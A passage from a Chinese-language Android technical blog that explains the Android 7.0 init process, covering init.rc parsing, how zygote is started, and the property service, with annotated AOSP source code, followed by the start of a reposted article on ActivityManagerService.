class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">on init</span><br><span class="line">    sysclktz 0</span><br><span class="line">    # Mix device-specific information into the entropy pool</span><br><span class="line">    copy &#x2F;proc&#x2F;cmdline &#x2F;dev&#x2F;urandom</span><br><span class="line">    copy &#x2F;default.prop &#x2F;dev&#x2F;urandom</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">on boot</span><br><span class="line">    # basic network init</span><br><span class="line">    ifup lo</span><br><span class="line">    hostname localhost</span><br><span class="line">    domainname localdomain</span><br><span class="line">    # set RLIMIT_NICE to allow priorities from 19 to -20</span><br><span class="line">    setrlimit 13 40 40</span><br><span class="line">...    </span><br></pre></td></tr></table></figure><p>这里只截取了一部分代码，其中#是注释符号。on init和on boot是Action类型语句，它的格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">on &lt;trigger&gt; [&amp;&amp; &lt;trigger&gt;]*     &#x2F;&#x2F;设置触发器  </span><br><span class="line">   &lt;command&gt;  </span><br><span class="line">   &lt;command&gt;      &#x2F;&#x2F;动作触发之后要执行的命令  </span><br></pre></td></tr></table></figure><p>为了分析如何创建zygote，我们主要查看Services类型语句，它的格式如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service &lt;name&gt; &lt;pathname&gt; [ &lt;argument&gt; ]*   &#x2F;&#x2F;&lt;service的名字&gt;&lt;执行程序路径&gt;&lt;传递参数&gt;  </span><br><span class="line">   &lt;option&gt;       &#x2F;&#x2F;option是service的修饰词，影响什么时候、如何启动services  </span><br><span class="line">   &lt;option&gt;  </span><br><span class="line">   ...  </span><br></pre></td></tr></table></figure><p>需要注意的是在Android 7.0中对init.rc文件进行了拆分，每个服务一个rc文件。我们要分析的zygote服务的启动脚本则在init.zygoteXX.rc中定义，这里拿64位处理器为例，init.zygote64.rc的代码如下所示。<br><strong>system/core/rootdir/init.zygote64.rc</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">service zygote &#x2F;system&#x2F;bin&#x2F;app_process64 -Xzygote &#x2F;system&#x2F;bin --zygote --start-system-server</span><br><span class="line">    class main</span><br><span class="line">    socket zygote stream 660 root system</span><br><span class="line">    onrestart write &#x2F;sys&#x2F;android_power&#x2F;request_state wake</span><br><span class="line">    onrestart write &#x2F;sys&#x2F;power&#x2F;state on</span><br><span class="line">    onrestart restart audioserver</span><br><span class="line">    onrestart restart cameraserver</span><br><span class="line">    onrestart restart media</span><br><span class="line">    onrestart restart netd</span><br><span class="line">    writepid &#x2F;dev&#x2F;cpuset&#x2F;foreground&#x2F;tasks &#x2F;dev&#x2F;stune&#x2F;foreground&#x2F;tasks</span><br></pre></td></tr></table></figure><p>其中service用于通知init进程创建名zygote的进程，这个zygote进程执行程序的路径为/system/bin/app_process64，后面的则是要传给app_process64的参数。class main指的是zygote的class name为main，后文会用到它。</p><h1 id="5-解析service"><a href="#5-解析service" class="headerlink" title="5.解析service"></a>5.解析service</h1><p>接下来我们来解析service，会用到两个函数，一个是ParseSection，它会解析service的rc文件，比如上文讲到的init.zygote64.rc，ParseSection函数主要用来搭建service的架子。另一个是ParseLineSection，用于解析子项。代码如下所示。<br><strong>system/core/init/service.cpp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bool ServiceParser::ParseSection(const std::vector&lt;std::string&gt;&amp; args,</span><br><span class="line">                                 std::string* err) &#123;</span><br><span class="line">    if (args.size() &lt; 3) &#123;</span><br><span class="line">        *err &#x3D; &quot;services must have a name and a program&quot;;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    const std::string&amp; name &#x3D; args[1];</span><br><span class="line">    if (!IsValidName(name)) &#123;</span><br><span class="line">        *err &#x3D; StringPrintf(&quot;invalid service name &#39;%s&#39;&quot;, name.c_str());</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    std::vector&lt;std::string&gt; str_args(args.begin() + 2, args.end());</span><br><span class="line">    service_ &#x3D; std::make_unique&lt;Service&gt;(name, &quot;default&quot;, str_args);&#x2F;&#x2F;1</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool ServiceParser::ParseLineSection(const std::vector&lt;std::string&gt;&amp; args,</span><br><span class="line">                                     const std::string&amp; filename, int line,</span><br><span class="line">                                     std::string* err) const &#123;</span><br><span class="line">    return service_ ? service_-&gt;HandleLine(args, err) : false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释1处，根据参数，构造出一个service对象，它的classname为”default”。当解析完毕时会调用EndSection：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void ServiceParser::EndSection() &#123;</span><br><span class="line">    if (service_) &#123;</span><br><span class="line">        ServiceManager::GetInstance().AddService(std::move(service_));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着查看AddService做了什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void ServiceManager::AddService(std::unique_ptr&lt;Service&gt; service) &#123;</span><br><span class="line">    Service* old_service &#x3D; FindServiceByName(service-&gt;name());</span><br><span class="line">    if (old_service) &#123;</span><br><span class="line">        ERROR(&quot;ignored duplicate definition of service &#39;%s&#39;&quot;,</span><br><span class="line">              service-&gt;name().c_str());</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    services_.emplace_back(std::move(service));&#x2F;&#x2F;1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释1处的代码将service对象加入到services链表中。上面的解析过程总体来讲就是根据参数创建出service对象，然后根据选项域的内容填充service对象，最后将service对象加入到vector类型的services链表中。，</p><h1 id="6-init启动zygote"><a href="#6-init启动zygote" class="headerlink" title="6.init启动zygote"></a>6.init启动zygote</h1><p>讲完了解析service，接下来该讲init是如何启动service，在这里我们主要讲解启动zygote这个service。在zygote的启动脚本中我们得知zygote的class name为main。在init.rc有如下配置代码：<br><strong>system/core/rootdir/init.rc</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">on nonencrypted    </span><br><span class="line">    # A&#x2F;B update verifier that marks a successful boot.  </span><br><span class="line">    exec - root -- &#x2F;system&#x2F;bin&#x2F;update_verifier nonencrypted  </span><br><span class="line">    class_start main         </span><br><span class="line">    class_start late_start </span><br><span class="line">...    </span><br></pre></td></tr></table></figure><p>其中class_start是一个COMMAND，对应的函数为do_class_start。我们知道main指的就是zygote，因此class_start main用来启动zygote。do_class_start函数在builtins.cpp中定义，如下所示。<br><strong>system/core/init/builtins.cpp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static int do_class_start(const std::vector&lt;std::string&gt;&amp; args) &#123;</span><br><span class="line">        &#x2F;* Starting a class does not start services</span><br><span class="line">         * which are explicitly disabled.  They must</span><br><span class="line">         * be started individually.</span><br><span class="line">         *&#x2F;</span><br><span class="line">    ServiceManager::GetInstance().</span><br><span class="line">        ForEachServiceInClass(args[1], [] (Service* s) &#123; s-&gt;StartIfNotDisabled(); &#125;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来查看StartIfNotDisabled做了什么：<br><strong>system/core/init/service.cpp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bool Service::StartIfNotDisabled() &#123;</span><br><span class="line">    if (!(flags_ &amp; SVC_DISABLED)) &#123;</span><br><span class="line">        return Start();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        flags_ |&#x3D; SVC_DISABLED_START;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着查看Start方法，如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">bool Service::Start() &#123;</span><br><span class="line">    flags_ &amp;&#x3D; (~(SVC_DISABLED|SVC_RESTARTING|SVC_RESET|SVC_RESTART|SVC_DISABLED_START));</span><br><span class="line">    time_started_ &#x3D; 0;</span><br><span class="line">    if (flags_ &amp; SVC_RUNNING) &#123;&#x2F;&#x2F;如果Service已经运行，则不启动</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    bool needs_console &#x3D; (flags_ &amp; SVC_CONSOLE);</span><br><span class="line">    if (needs_console &amp;&amp; !have_console) &#123;</span><br><span class="line">        ERROR(&quot;service &#39;%s&#39; requires console\n&quot;, name_.c_str());</span><br><span class="line">        flags_ |&#x3D; SVC_DISABLED;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#x2F;&#x2F;判断需要启动的Service的对应的执行文件是否存在，不存在则不启动该Service</span><br><span class="line">    struct stat sb;</span><br><span class="line">    if (stat(args_[0].c_str(), &amp;sb) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        ERROR(&quot;cannot find &#39;%s&#39; (%s), disabling &#39;%s&#39;\n&quot;,</span><br><span class="line">              args_[0].c_str(), strerror(errno), name_.c_str());</span><br><span class="line">        flags_ |&#x3D; SVC_DISABLED;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    pid_t pid &#x3D; fork();&#x2F;&#x2F;1.fork函数创建子进程</span><br><span class="line">    if (pid &#x3D;&#x3D; 0) &#123;&#x2F;&#x2F;运行在子进程中</span><br><span class="line">        umask(077);</span><br><span class="line">        for (const auto&amp; ei : envvars_) &#123;</span><br><span class="line">            add_environment(ei.name.c_str(), ei.value.c_str());</span><br><span class="line">        &#125;</span><br><span class="line">        for (const auto&amp; si : sockets_) &#123;</span><br><span class="line">            int socket_type &#x3D; ((si.type &#x3D;&#x3D; &quot;stream&quot; ? SOCK_STREAM :</span><br><span class="line">                                (si.type &#x3D;&#x3D; &quot;dgram&quot; ? SOCK_DGRAM :</span><br><span class="line">                                 SOCK_SEQPACKET)));</span><br><span class="line">            const char* socketcon &#x3D;</span><br><span class="line">                !si.socketcon.empty() ? si.socketcon.c_str() : scon.c_str();</span><br><span class="line"></span><br><span class="line">            int s &#x3D; create_socket(si.name.c_str(), socket_type, si.perm,</span><br><span class="line">                                  si.uid, si.gid, socketcon);</span><br><span class="line">            if (s &gt;&#x3D; 0) &#123;</span><br><span class="line">                PublishSocket(si.name, s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">        &#x2F;&#x2F;2.通过execve执行程序</span><br><span class="line">        if (execve(args_[0].c_str(), (char**) &amp;strs[0], (char**) ENV) &lt; 0) &#123;</span><br><span class="line">            ERROR(&quot;cannot execve(&#39;%s&#39;): %s\n&quot;, args_[0].c_str(), strerror(errno));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _exit(127);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过注释1和2的代码，我们得知在Start方法中调用fork函数来创建子进程，并在子进程中调用execve执行system/bin/app_process，这样就会进入framework/cmds/app_process/app_main.cpp的main函数，如下所示。<br><strong>frameworks/base/cmds/app_process/app_main.cpp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char* const argv[])</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    if (zygote) &#123;</span><br><span class="line">        runtime.start(&quot;com.android.internal.os.ZygoteInit&quot;, args, zygote);&#x2F;&#x2F;1</span><br><span class="line">    &#125; else if (className) &#123;</span><br><span class="line">        runtime.start(&quot;com.android.internal.os.RuntimeInit&quot;, args, zygote);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        fprintf(stderr, &quot;Error: no class name or --zygote supplied.\n&quot;);</span><br><span class="line">        app_usage();</span><br><span class="line">        LOG_ALWAYS_FATAL(&quot;app_process: no class name or --zygote supplied.&quot;);</span><br><span class="line">        return 10;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从注释1处的代码可以得知调用runtime(AppRuntime)的start来启动zygote。</p><h1 id="7-属性服务"><a href="#7-属性服务" class="headerlink" title="7.属性服务"></a>7.属性服务</h1><p>Windows平台上有一个注册表管理器，注册表的内容采用键值对的形式来记录用户、软件的一些使用信息。即使系统或者软件重启，它还是能够根据之前在注册表中的记录，进行相应的初始化工作。Android也提供了一个类似的机制，叫做属性服务。<br>在本文的开始，我们提到在init.cpp代码中和属性服务相关的代码有：<br><strong>system/core/init/init.cpp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">property_init();</span><br><span class="line">start_property_service();</span><br></pre></td></tr></table></figure><p>这两句代码用来初始化属性服务配置并启动属性服务。首先我们来学习服务配置的初始化和启动。</p><p><strong>属性服务初始化与启动</strong></p><p>property_init函数具体实现的代码如下所示。<br><strong>system/core/init/property_service.cpp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void property_init() &#123;</span><br><span class="line">    if (__system_property_area_init()) &#123;</span><br><span class="line">        ERROR(&quot;Failed to initialize property area\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__system_property_area_init函数用来初始化属性内存区域。接下来查看start_property_service函数的具体代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void start_property_service() &#123;</span><br><span class="line">    property_set_fd &#x3D; create_socket(PROP_SERVICE_NAME, SOCK_STREAM | SOCK_CLOEXEC | SOCK_NONBLOCK,</span><br><span class="line">                                    0666, 0, 0, NULL);&#x2F;&#x2F;1</span><br><span class="line">    if (property_set_fd &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        ERROR(&quot;start_property_service socket creation failed: %s\n&quot;, strerror(errno));</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    listen(property_set_fd, 8);&#x2F;&#x2F;2</span><br><span class="line">    register_epoll_handler(property_set_fd, handle_property_set_fd);&#x2F;&#x2F;3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释1处用来创建非阻塞的socket。注释2处调用listen函数对property_set_fd进行监听，这样创建的socket就成为了server，也就是属性服务；listen函数的第二个参数设置8意味着属性服务最多可以同时为8个试图设置属性的用户提供服务。注释3处的代码将property_set_fd放入了epoll句柄中，用epoll来监听property_set_fd：当property_set_fd中有数据到来时，init进程将用handle_property_set_fd函数进行处理。<br>在linux新的内核中，epoll用来替换select，epoll最大的好处在于它不会随着监听fd数目的增长而降低效率。因为内核中的select实现是采用轮询来处理的，轮询的fd数目越多，自然耗时越多。</p><p><strong>属性服务处理请求</strong><br>从上文我们得知，属性服务接收到客户端的请求时，会调用handle_property_set_fd函数进行处理：<br><strong>system/core/init/property_service.cpp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">static void handle_property_set_fd()</span><br><span class="line">&#123;  </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        if(memcmp(msg.name,&quot;ctl.&quot;,4) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            close(s);</span><br><span class="line">            if (check_control_mac_perms(msg.value, source_ctx, &amp;cr)) &#123;</span><br><span class="line">                handle_control_message((char*) msg.name + 4, (char*) msg.value);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                ERROR(&quot;sys_prop: Unable to %s service ctl [%s] uid:%d gid:%d pid:%d\n&quot;,</span><br><span class="line">                        msg.name + 4, msg.value, cr.uid, cr.gid, cr.pid);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F;检查客户端进程权限</span><br><span class="line">            if (check_mac_perms(msg.name, source_ctx, &amp;cr)) &#123;&#x2F;&#x2F;1</span><br><span class="line">                property_set((char*) msg.name, (char*) msg.value);&#x2F;&#x2F;2</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                ERROR(&quot;sys_prop: permission denied uid:%d  name:%s\n&quot;,</span><br><span class="line">                      cr.uid, msg.name);</span><br><span class="line">            &#125;</span><br><span class="line">            close(s);</span><br><span class="line">        &#125;</span><br><span class="line">        freecon(source_ctx);</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        close(s);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释1处的代码用来检查客户端进程权限，在注释2处则调用property_set函数对属性进行修改，代码如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int property_set(const char* name, const char* value) &#123;</span><br><span class="line">    int rc &#x3D; property_set_impl(name, value);</span><br><span class="line">    if (rc &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        ERROR(&quot;property_set(\&quot;%s\&quot;, \&quot;%s\&quot;) failed\n&quot;, name, value);</span><br><span class="line">    &#125;</span><br><span class="line">    return rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>property_set函数主要调用了property_set_impl函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">static int property_set_impl(const char* name, const char* value) &#123;</span><br><span class="line">    size_t namelen &#x3D; strlen(name);</span><br><span class="line">    size_t valuelen &#x3D; strlen(value);</span><br><span class="line">    if (!is_legal_property_name(name, namelen)) return -1;</span><br><span class="line">    if (valuelen &gt;&#x3D; PROP_VALUE_MAX) return -1;</span><br><span class="line">    if (strcmp(&quot;selinux.reload_policy&quot;, name) &#x3D;&#x3D; 0 &amp;&amp; strcmp(&quot;1&quot;, value) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        if (selinux_reload_policy() !&#x3D; 0) &#123;</span><br><span class="line">            ERROR(&quot;Failed to reload policy\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (strcmp(&quot;selinux.restorecon_recursive&quot;, name) &#x3D;&#x3D; 0 &amp;&amp; valuelen &gt; 0) &#123;</span><br><span class="line">        if (restorecon_recursive(value) !&#x3D; 0) &#123;</span><br><span class="line">            ERROR(&quot;Failed to restorecon_recursive %s\n&quot;, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;从属性存储空间查找该属性</span><br><span class="line">    prop_info* pi &#x3D; (prop_info*) __system_property_find(name);</span><br><span class="line">    &#x2F;&#x2F;如果属性存在</span><br><span class="line">    if(pi !&#x3D; 0) &#123;</span><br><span class="line">       &#x2F;&#x2F;如果属性以&quot;ro.&quot;开头，则表示是只读，不能修改，直接返回</span><br><span class="line">        if(!strncmp(name, &quot;ro.&quot;, 3)) return -1;</span><br><span class="line">       &#x2F;&#x2F;更新属性值</span><br><span class="line">        __system_property_update(pi, value, valuelen);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">       &#x2F;&#x2F;如果属性不存在则添加该属性</span><br><span class="line">        int rc &#x3D; __system_property_add(name, namelen, value, valuelen);</span><br><span class="line">        if (rc &lt; 0) &#123;</span><br><span class="line">            return rc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;* If name starts with &quot;net.&quot; treat as a DNS property. *&#x2F;</span><br><span class="line">    if (strncmp(&quot;net.&quot;, name, strlen(&quot;net.&quot;)) &#x3D;&#x3D; 0)  &#123;</span><br><span class="line">        if (strcmp(&quot;net.change&quot;, name) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">      &#x2F;&#x2F;以net.开头的属性名称更新后，需要将属性名称写入net.change中  </span><br><span class="line">        property_set(&quot;net.change&quot;, name);</span><br><span class="line">    &#125; else if (persistent_properties_loaded &amp;&amp;</span><br><span class="line">            strncmp(&quot;persist.&quot;, name, strlen(&quot;persist.&quot;)) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        &#x2F;*</span><br><span class="line">         * Don&#39;t write properties to disk until after we have read all default properties</span><br><span class="line">         * to prevent them from being overwritten by default values.</span><br><span class="line">         *&#x2F;</span><br><span class="line">        write_persistent_property(name, value);</span><br><span class="line">    &#125;</span><br><span class="line">    property_changed(name, value);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>property_set_impl函数主要用来对属性进行修改，并对以ro、net和persist开头的属性进行相应的处理。到这里，属性服务处理请求的源码就讲到这。</p><h1 id="8-init进程总结"><a href="#8-init进程总结" class="headerlink" title="8.init进程总结"></a>8.init进程总结</h1><p>讲到这，总结起来init进程主要做了三件事：</p><ol><li>创建一些文件夹并挂载设备</li><li>初始化和启动属性服务</li><li>解析init.rc配置文件并启动zygote进程</li></ol><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>《深入理解Android系统》<br>《深入理解Android卷I》<br><a href="http://www.cnblogs.com/nokiaguy/archive/2013/04/14/3020774.html">Android的init过程详解（一）</a><br><a href="http://blog.jobbole.com/67931/">Android启动过程深入解析</a><br><a href="http://blog.csdn.net/fu_kevin0606/article/details/53383031">Android7.0解析Init.rc文件</a><br><a href="http://blog.csdn.net/sunao2002002/article/details/52454878">Android 7.0 init.rc的一点改变</a><br><a href="http://blog.csdn.net/gaugamela/article/details/52133186">Android7.0 init进程源码分析</a><br><a href="http://blog.csdn.net/hu3167343/article/details/38230271">Android情景分析之属性服务</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android AMS启动流程和AMS家族</title>
      <link href="/2021/09/21/Android-AMS%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%92%8CAMS%E5%AE%B6%E6%97%8F/"/>
      <url>/2021/09/21/Android-AMS%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%92%8CAMS%E5%AE%B6%E6%97%8F/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://blog.csdn.net/itachi85/article/details/76405596">Android解析ActivityManagerService（一）AMS启动流程和AMS家族</a> (遵循CC 4.0 BY-SA版权协议)<br>关联系列<br><a href="http://liuwangshu.cn/tags/Android%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8/">Android系统启动流程系列</a><br><a href="http://liuwangshu.cn/tags/Android%E5%BA%94%E7%94%A8%E8%BF%9B%E7%A8%8B/">Android应用进程系列</a><br><a href="http://liuwangshu.cn/tags/Android%E6%B7%B1%E5%85%A5%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6/">Android深入四大组件系列</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此前在Android系统启动流程、应用进程以及深入四大组件这三个系列文章中，都提及到了AMS，但都没有系统的来讲解它，本文就以AMS为主来进行讲解，其中会有一些知识点与这些系列文章有所重合，这里会尽量做到详尽讲解。阅读此文章前，最好阅读相关文章中列出的系列文章，否则我不敢保证这篇文章你能看的懂。</p><h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h1><p>AMS是系统的引导服务，应用进程的启动、切换和调度、四大组件的启动和管理都需要AMS的支持。从这里可以看出AMS的功能会十分的繁多，当然它并不是一个类承担这个重责，它有一些关联类，这在文章后面会讲到。AMS的涉及的知识点非常多，这篇文章主要会讲解AMS的以下几个知识点：</p><ul><li>AMS的启动流程。</li><li>AMS与进程启动。</li><li>AMS家族。<h1 id="2-AMS的启动流程"><a href="#2-AMS的启动流程" class="headerlink" title="2.AMS的启动流程"></a>2.AMS的启动流程</h1>AMS的启动是在SyetemServer进程中启动的，在<a href="http://liuwangshu.cn/framework/booting/3-syetemserver.html">Android系统启动流程（三）解析SyetemServer进程启动过程</a>这篇文章中提及过，这里从SyetemServer的main方法开始讲起：</li></ul><p><strong>frameworks/base/services/java/com/android/server/SystemServer.java</strong></p><figure 